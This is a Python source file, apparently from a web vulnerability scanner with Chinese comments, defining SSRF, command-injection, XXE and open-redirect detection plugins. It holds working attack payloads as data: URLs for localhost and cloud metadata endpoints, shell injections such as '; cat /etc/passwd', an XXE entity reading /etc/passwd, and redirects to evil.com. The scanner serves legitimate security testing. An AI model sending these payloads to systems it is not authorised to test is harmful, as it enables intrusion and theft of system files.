"""更多漏洞检测插件"""
from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode

from .plugin_system import VulnPlugin
from ..vuln.base import Vulnerability, Severity


class SSRFPlugin(VulnPlugin):
    """SSRF (服务器端请求伪造) 检测插件"""
    
    name = "ssrf_detector"
    version = "1.0.0"
    author = "WVS Team"
    description = "检测服务器端请求伪造漏洞"
    severity = "HIGH"
    
    # SSRF 测试 payload
    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://169.254.169.254",  # AWS 元数据
        "http://metadata.google.internal",  # GCP 元数据
        "file:///etc/passwd",
        "dict://localhost:11211/",
        "ftp://localhost:21/",
    ]
    
    async def check(self, target: str, context: Dict) -> List[Vulnerability]:
        """检测 SSRF 漏洞"""
        vulns = []
        session = context.get("session")
        urls = context.get("urls", [])
        
        if not session:
            return vulns
        
        # 检测 URL 参数
        for url in urls:
            parsed = urlparse(url)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            for param_name in params:
                # 检查参数名是否可能是 URL 参数
                if any(keyword in param_name.lower() for keyword in 
                       ["url", "path", "dest", "redirect", "uri", "src", "link"]):
                    
                    for payload in self.SSRF_PAYLOADS[:3]:  # 限制测试数量
                        result = await self._test_ssrf(url, param_name, payload, session)
                        if result:
                            vulns.append(result)
                            break
        
        return vulns
    
    async def _test_ssrf(self, url: str, param: str, payload: str, session) -> Vulnerability:
        """测试 SSRF"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
        
        try:
            async with session.get(test_url, timeout=10, ssl=False, allow_redirects=False) as resp:
                # 检查响应时间或特定错误
                if resp.status in [200, 301, 302, 307, 308]:
                    text = await resp.text()
                    
                    # 检查是否访问了内部资源
                    if any(indicator in text for indicator in 
                           ["root:x:0:0:", "localhost", "127.0.0.1", "internal server"]):
                        return Vulnerability(
                            name=f"SSRF 漏洞 (参数: {param})",
                            severity=Severity.HIGH,
                            url=test_url,
                            payload=payload,
                            description=f"参数 `{param}` 存在 SSRF 漏洞，可访问内部资源",
                            remediation="验证和过滤 URL 输入，使用白名单限制访问目标",
                            confidence=0.8,
                        )
        except Exception:
            pass
        return None


class CommandInjectionPlugin(VulnPlugin):
    """命令注入检测插件"""
    
    name = "cmd_injection_detector"
    version = "1.0.0"
    author = "WVS Team"
    description = "检测命令注入漏洞"
    severity = "CRITICAL"
    
    # 命令注入 payload
    CMD_PAYLOADS = [
        "; id",
        "| id",
        "` id `",
        "$(id)",
        "; whoami",
        "| whoami",
        "; cat /etc/passwd",
        "&& id",
        "|| id",
    ]
    
    # 命令执行成功的特征
    SUCCESS_PATTERNS = [
        "uid=",
        "gid=",
        "root:x:0:0:",
        "daemon:x:",
        "bin:x:",
    ]
    
    async def check(self, target: str, context: Dict) -> List[Vulnerability]:
        """检测命令注入"""
        vulns = []
        session = context.get("session")
        urls = context.get("urls", [])
        
        if not session:
            return vulns
        
        for url in urls:
            parsed = urlparse(url)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            for param_name in params:
                # 测试命令注入
                for payload in self.CMD_PAYLOADS[:3]:
                    result = await self._test_cmd_injection(url, param_name, payload, session)
                    if result:
                        vulns.append(result)
                        break
        
        return vulns
    
    async def _test_cmd_injection(self, url: str, param: str, payload: str, session) -> Vulnerability:
        """测试命令注入"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
        
        try:
            async with session.get(test_url, timeout=10, ssl=False) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    
                    # 检查命令执行特征
                    for pattern in self.SUCCESS_PATTERNS:
                        if pattern in text:
                            return Vulnerability(
                                name=f"命令注入 (参数: {param})",
                                severity=Severity.CRITICAL,
                                url=test_url,
                                payload=payload,
                                description=f"参数 `{param}` 存在命令注入漏洞",
                                remediation="禁止直接拼接命令，使用参数化 API 或白名单验证",
                                confidence=0.9,
                            )
        except Exception:
            pass
        return None


class XXEPlugin(VulnPlugin):
    """XXE (XML 外部实体) 检测插件"""
    
    name = "xxe_detector"
    version = "1.0.0"
    author = "WVS Team"
    description = "检测 XML 外部实体注入漏洞"
    severity = "HIGH"
    
    # XXE 测试 payload
    XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>"""
    
    async def check(self, target: str, context: Dict) -> List[Vulnerability]:
        """检测 XXE"""
        vulns = []
        session = context.get("session")
        urls = context.get("urls", [])
        
        if not session:
            return vulns
        
        for url in urls:
            # 检查是否是 XML 接口
            if any(indicator in url.lower() for indicator in 
                   ["xml", "soap", "wsdl", "api", "service"]):
                
                result = await self._test_xxe(url, session)
                if result:
                    vulns.append(result)
        
        return vulns
    
    async def _test_xxe(self, url: str, session) -> Vulnerability:
        """测试 XXE"""
        try:
            headers = {"Content-Type": "application/xml"}
            async with session.post(url, data=self.XXE_PAYLOAD, 
                                   headers=headers, timeout=10, ssl=False) as resp:
                text = await resp.text()
                
                if "root:x:0:0:" in text:
                    return Vulnerability(
                        name="XXE 漏洞",
                        severity=Severity.HIGH,
                        url=url,
                        payload="XXE payload",
                        description="XML 解析器存在 XXE 漏洞，可读取系统文件",
                        remediation="禁用外部实体解析，使用安全的 XML 解析器配置",
                        confidence=0.85,
                    )
        except Exception:
            pass
        return None


class OpenRedirectPlugin(VulnPlugin):
    """开放重定向检测插件"""
    
    name = "open_redirect_detector"
    version = "1.0.0"
    author = "WVS Team"
    description = "检测开放重定向漏洞"
    severity = "MEDIUM"
    
    # 重定向测试 payload
    REDIRECT_PAYLOADS = [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "http://evil.com",
        "evil.com",
    ]
    
    async def check(self, target: str, context: Dict) -> List[Vulnerability]:
        """检测开放重定向"""
        vulns = []
        session = context.get("session")
        urls = context.get("urls", [])
        
        if not session:
            return vulns
        
        for url in urls:
            parsed = urlparse(url)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            for param_name in params:
                # 检查是否是重定向参数
                if any(keyword in param_name.lower() for keyword in 
                       ["redirect", "url", "next", "return", "goto", "link", "target"]):
                    
                    for payload in self.REDIRECT_PAYLOADS[:2]:
                        result = await self._test_redirect(url, param_name, payload, session)
                        if result:
                            vulns.append(result)
                            break
        
        return vulns
    
    async def _test_redirect(self, url: str, param: str, payload: str, session) -> Vulnerability:
        """测试重定向"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
        
        try:
            async with session.get(test_url, timeout=10, ssl=False, allow_redirects=False) as resp:
                # 检查是否重定向到外部域名
                location = resp.headers.get("Location", "")
                if payload in location or "evil.com" in location:
                    return Vulnerability(
                        name=f"开放重定向 (参数: {param})",
                        severity=Severity.MEDIUM,
                        url=test_url,
                        payload=payload,
                        description=f"参数 `{param}` 存在开放重定向漏洞",
                        remediation="验证重定向目标，使用白名单限制跳转域名",
                        confidence=0.8,
                    )
        except Exception:
            pass
        return None


# 注册所有插件
from .plugin_system import plugin_manager

plugin_manager.register(SSRFPlugin)
plugin_manager.register(CommandInjectionPlugin)
plugin_manager.register(XXEPlugin)
plugin_manager.register(OpenRedirectPlugin)
